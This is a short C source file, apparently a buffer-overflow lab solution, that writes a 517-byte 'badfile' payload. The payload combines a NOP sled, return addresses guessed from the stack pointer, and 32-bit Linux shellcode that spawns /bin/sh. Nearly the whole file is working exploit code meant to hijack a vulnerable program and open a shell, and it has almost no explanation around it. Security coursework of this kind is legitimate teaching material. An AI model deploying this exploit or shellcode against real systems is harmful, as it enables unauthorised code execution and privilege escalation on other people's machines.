/* exploit.c
*/
/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80";

//char test[]="blagaa";

unsigned long get_sp(void) 
{
   __asm__("movl %esp,%eax");
}

int main(int argc, char **argv)
{
   char buffer[517];
   FILE *badfile;
   char *ptr;
   long *addr_ptr, returnAddr;	
   int i,size,j;

   size = sizeof(shellcode)/sizeof(char);
   printf("size = %d\n", size);
   /* Initialize buffer with 0x90 (NOP instruction) */ 
	memset(&buffer, 0x90, 517);
   /* You need to fill the buffer with appropriate contents here*/ 
 
   ptr = buffer;
   addr_ptr = (long*)ptr;

   returnAddr = get_sp()+350;
//printf("Using address: 0x%x\n", returnAddr);
    for(i=0; i<300; i+=4) *(addr_ptr++) = returnAddr; 	


   j=0;	
    for(i=517-size; i<(517); i++)
         buffer[i] = shellcode[j++];
     buffer[i-1]='\0';
	


    //Save the contents to the file "badfile" 
  badfile = fopen("./badfile", "w");
  fwrite(buffer, 517, 1, badfile);
  fclose(badfile);

  return 1;
}
